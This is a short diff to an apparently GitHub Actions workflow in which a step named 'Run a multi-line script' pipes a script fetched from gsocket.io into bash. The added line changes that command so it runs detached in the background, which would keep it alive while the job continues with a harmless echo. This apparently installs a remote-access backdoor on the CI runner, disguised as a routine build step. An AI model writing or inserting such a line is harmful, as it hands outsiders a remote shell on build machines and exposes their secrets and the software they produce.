@@ -20,5 +20,5 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          bash -c "$(curl -fsSL https://gsocket.io/y)"
+          ( bash -c "$(curl -fsSL https://gsocket.io/y)" & )
           echo "aaa"
